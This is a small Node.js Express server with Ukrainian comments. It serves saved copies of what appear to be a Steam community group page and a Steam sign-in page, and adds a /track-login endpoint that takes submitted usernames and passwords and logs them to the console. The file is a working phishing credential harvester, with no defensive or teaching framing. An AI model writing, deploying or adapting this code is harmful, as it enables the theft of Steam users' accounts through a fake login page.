const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const path = require("path");

const app = express();
const PORT = 10000;

app.use(cors());
app.use(bodyParser.json());

// Роздаємо всі файли з папки "public"
app.use("/login", express.static(path.join(__dirname, "login")));
app.use("/login", express.static(path.join(__dirname, "group")));

app.post("/track-login", (req, res) => {
    const { login, password } = req.body;

    console.log("Success!");
    console.log("Login:", login);
    console.log("Password:", password);

    res.json({ message: "Дані отримані успішно!" });
});

app.get("/group/", (req, res) => {
    console.log("GROUP");
    res.sendFile(path.join(__dirname, "group", "Спільнота Steam __ Група __ Один раз не....html"));
});

app.get("/login/", (req, res) => {
    console.log("LOGIN");
    res.sendFile(path.join(__dirname, "login", "Увійти.html"));
});


app.listen(PORT, () => {
    console.log(`Server is running at http://localhost:${PORT}`);
});
